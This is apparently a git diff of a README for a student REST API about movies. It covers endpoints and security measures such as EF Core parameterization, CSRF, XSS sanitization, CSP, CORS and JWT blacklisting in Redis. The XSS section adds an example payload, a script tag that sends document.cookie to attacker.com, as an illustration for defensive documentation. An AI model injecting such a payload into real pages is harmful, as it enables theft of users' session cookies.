@@ -4,8 +4,8 @@ REST API for managing movies, direcotrs and production companies
 
 ## Endpoints
  - Movies: GetAll, GetByID, Create, Update and Delete
- - Movies: GetAll, GetByID
- - Movies: GetAll, GetByID
+ - Directors: GetAll, GetByID
+ - ProductionCompanies: GetAll, GetByID
 GetAll uses pagination
 
 
@@ -23,19 +23,23 @@ docker compose up -d
 ### SQL Injection
 EF Core protects from SQL injection because it uses parameterized queries under the hood, so user input is never treated as raw SQL.
 
-### CRSF
+### CSRF
 An attacker tricks a user’s browser into sending a request to another website
 For modern APIs that store API keys in headers or use OAuth CSRF is not a problem
 
 ### XSS (Cross-Site Scripting)
-The XSS process
-1. An attacker injects HTML or JavaScript code in a website
-2. The website will make a subsequent API call passing the code as a parameter
-    • It could be a link, so that the code could even reside in another website
-3. The code will be executed by the API server at some point
-We sanitize input using /rest/Middleware/XssMiddleware.cs
-Middleware is applied in program.cs with app.UseMiddleware<XssMiddleware>();
-Content-Security-Policy (CSP) header is added to every response, tells the browser which resources (scripts, styles, images) are allowed to be loaded and executed on a specific page
+The XSS process: 
+ - Injection: An attacker sends a malicious script via an API request (e.g., in a comment field, username, or profile description).
+
+    Example payload: <script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
+
+ - Storage/Processing: The API receives the JSON payload and stores the malicious string in the database without sanitizing it.
+
+ - Execution: A victim's browser requests data from the API. The frontend JavaScript receives the JSON and injects the malicious string directly into the DOM (e.g., using .innerHTML). The browser then executes the script.
+
+#### XSS prevention
+string input Genre and title in Create and Update movie endpoints get sanitized using HtmlSanitizer installed with nuget pakage.
+Content-Security-Policy (CSP) header is added to every response, it tells the browser which resources (scripts, styles, images) are allowed to be loaded and executed on a specific page
 How CSP header protects against XSS
 
 XSS works by tricking a browser into executing malicious code. CSP prevents this in three main ways:
@@ -70,20 +74,22 @@ base-uri 'none': Prevent relative links to resolve to an attacker domain (e.g., 
 This API is using URI versioning, meaning the version is in the path api/v1/movies
 
 ### CORS
-CORS is cinfigured in program.cs where it allows any method from client "http://localhost:3000"
+CORS is configured in program.cs where it allows any method from client "http://localhost:3000"
 CORS is applied in program.cs with app.UseCors("AllowFrontend");
+
+### jwt revocation strategy
+The API is using blacklisting because it is the most statefull strategy. When a user logs out the token gets stored in a redis database.
+To check if the token is stored in redis, use this command
+```bash
+docker exec -it <container-name> redis-cli
+127.0.0.1:6379> keys *
+```
+
+
 
 
 ### to do
-.gitignore?
 
-OAuth2
-JWT
-what endpoint should have Authorize
-In Arturos powerpoint he mentions filtering not search
-Choose a revocation strategy - i think blacklist because then the api is still stateless
-HATEOAS on getall?
+HATEOAS and filters on getall
 OpenAPI documentation 
-postman tests
-CI pipeline
 Finnish readme
